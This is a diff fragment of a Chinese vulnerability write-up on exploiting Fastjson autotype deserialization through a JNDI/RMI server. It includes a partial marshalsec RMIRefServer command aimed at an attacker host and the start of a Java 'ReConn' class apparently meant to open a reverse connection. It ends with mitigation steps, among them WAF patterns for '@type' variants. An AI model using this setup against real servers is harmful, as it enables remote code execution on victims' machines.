@@ -28,7 +28,7 @@ source: "MrWQ/vulnerability-paper"
     ===================
     
 
-假设攻击机为 A   被攻击机为 B
+假设攻击机为 A   被攻击机为 B
 
 在 A 上搭好 web 服务和 rmi 服务, 并且能够让 B 访问主机 A
 
@@ -74,7 +74,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jarmarshalsec.jndi.RMIRefServer"http://19
     =============
     
 
-注意红色框重点  RMI 服务后面跟 A 主机开放的域名 (ip): 端口 / 恶意类名称
+注意红色框重点  RMI 服务后面跟 A 主机开放的域名 (ip): 端口 / 恶意类名称
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2hYQvLId63jWBnTQQ8FjPHaFkKZVFBTaIISeduth1dFRgub157ZlkH0rialqEfGhzybXLcOTuVH2g/640?wx_fmt=png)
 
@@ -113,7 +113,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jarmarshalsec.jndi.RMIRefServer"http://19
 代码如下:
 
 ```
-import java.lang.Runtime;
+import java.lang.Runtime;
 import java.lang.Process;
 
 public class ReConn{
@@ -158,15 +158,15 @@ public class ReConn{
     ========
     
 
-    1、升级 Fastjson 到最新版 (>=1.2.68 新增了 safemode, 彻底关闭 autotype)；
+    1、升级 Fastjson 到最新版 (>=1.2.68 新增了 safemode, 彻底关闭 autotype)；
 
-    2、WAF 拦截过滤请求包中的 
+    2、WAF 拦截过滤请求包中的 
 
 @type、%u0040%u0074%u0079%u0070%u0065, \u0040type,
 
 \x04type 等多种编码的 autotype 变形；
 
-    3、最少升级到 1.2.48 以上版本且关闭 autotype 选项；升级对应 JDK 版本到 8u191/7u201/6u211/11.0.1 以上。
+    3、最少升级到 1.2.48 以上版本且关闭 autotype 选项；升级对应 JDK 版本到 8u191/7u201/6u211/11.0.1 以上。
 
 1.《从实践中学习 TCP/IP 协议》
 
